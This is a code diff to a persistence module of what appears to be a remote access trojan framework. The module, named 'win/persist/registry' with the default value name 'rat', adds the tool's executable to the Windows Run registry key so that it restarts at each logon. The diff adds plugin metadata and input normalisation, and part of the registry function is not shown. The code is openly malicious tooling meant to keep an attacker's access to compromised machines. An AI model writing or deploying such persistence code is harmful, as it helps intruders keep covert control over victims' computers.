@@ -1,3 +1,28 @@
+SCRIPT_METADATA = {
+    "name": "win/persist/registry",
+    "display_name": "Registry Persistence",
+    "description": "Create, query, or delete a Windows Run registry persistence entry",
+    "platforms": ["windows"],
+    "category": "Persistence",
+    "params": [
+        {
+            "name": "action",
+            "type": "select",
+            "required": False,
+            "default": "help",
+            "options": ["help", "create", "delete", "query"],
+            "description": "Registry operation"
+        },
+        {
+            "name": "name",
+            "type": "string",
+            "required": False,
+            "default": "rat",
+            "description": "Registry value name"
+        }
+    ]
+}
+
 import winreg
 
 from core.utils.client_util import get_executable_path
@@ -5,6 +30,18 @@ from core.utils.client_util import get_executable_path
 DEFAULT_NAME = 'rat'
 EXECUTABLE_PATH = get_executable_path()
 KEY_PATH = r'Software\Microsoft\Windows\CurrentVersion\Run'
+
+
+def normalize_action(value):
+    action = str(value or 'help').strip().lower()
+    if action in {'create', 'delete', 'query', 'help'}:
+        return action
+    return action
+
+
+def normalize_name(value):
+    text = str(value or DEFAULT_NAME).strip()
+    return text or DEFAULT_NAME
 
 
 def registry(action, name):
@@ -62,6 +99,6 @@ def registry(action, name):
         winreg.CloseKey(key)
 
 
-action = kwargs.get('action', 'help')
-name = kwargs.get('name', DEFAULT_NAME)
+action = normalize_action(kwargs.get('action', 'help'))
+name = normalize_name(kwargs.get('name', DEFAULT_NAME))
 registry(action=action, name=name)
